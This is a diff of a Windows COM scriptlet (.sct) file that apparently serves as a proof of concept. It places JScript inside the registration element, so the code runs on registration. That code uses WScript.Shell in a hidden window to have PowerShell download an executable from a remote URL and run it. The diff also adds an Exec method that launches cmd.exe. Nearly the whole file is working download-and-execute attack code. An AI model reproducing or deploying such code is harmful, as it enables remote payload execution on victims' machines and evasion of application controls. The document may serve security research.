@@ -2,18 +2,31 @@
 <scriptlet>
 
 <registration
-    description="Bandit"
-    progid="Bandit"
+    description="Test"
+    progid="Test"
     version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-    remotable="true"
+    classid="{10001111-0000-0000-0000-0000FEEDACDC}"
 	>
+	
+	<script language="JScript">
+		<![CDATA[
+	
+			new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'",0,true);
+	
+		]]>
+</script>
 </registration>
 
+<public>
+    <method name="Exec"></method>
+</public>
 <script language="JScript">
 <![CDATA[
-
-		new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'",0,true);
+	
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	}
 	
 ]]>
 </script>
